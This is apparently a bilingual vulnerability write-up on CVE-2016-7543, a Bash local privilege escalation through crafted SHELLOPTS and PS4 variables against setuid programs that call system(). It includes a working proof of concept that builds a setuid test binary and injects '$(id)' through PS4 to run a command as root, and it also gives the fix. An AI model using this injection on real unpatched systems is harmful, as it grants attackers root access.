# CVE-2016-7543
---
## threat type
  local  

---

## vulnerability type  
  输入验证.

---
## introduction
  Bash 4.4之前的版本中存在安全漏洞。本地攻击者可借助特制的SHELLOPTS和PS4环境变量利用该漏洞以root权限执行任意命令。
  The recent bash 4.4 patched an old attack vector regardingspecially crafted SHELLOPTS+PS4 environment variables against bogus setuid binaries using system()/popen().

---
## recurrence
```sh
# gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }'
# chmod 4755 ./test
# ls -l ./test
-rwsr-xr-x. 1 root root 8549 Sep 10 18:06 ./test
# exit
$ env -i SHELLOPTS=xtrace PS4='$(id)' ./test #xtrace+PS4可以在带有system的二进制中执行额外的命令
uid=0(root)
Sat Sep 10 18:06:36 WET 2016
```

---
## exploitaion  
  使用了system/popen+的带有S权限的二进制程序，我们可以利用SHELLOPTS+PS4以root权限执行任意命令。

---
## fix
  获取PS4的值之前，判断euid是否为0.
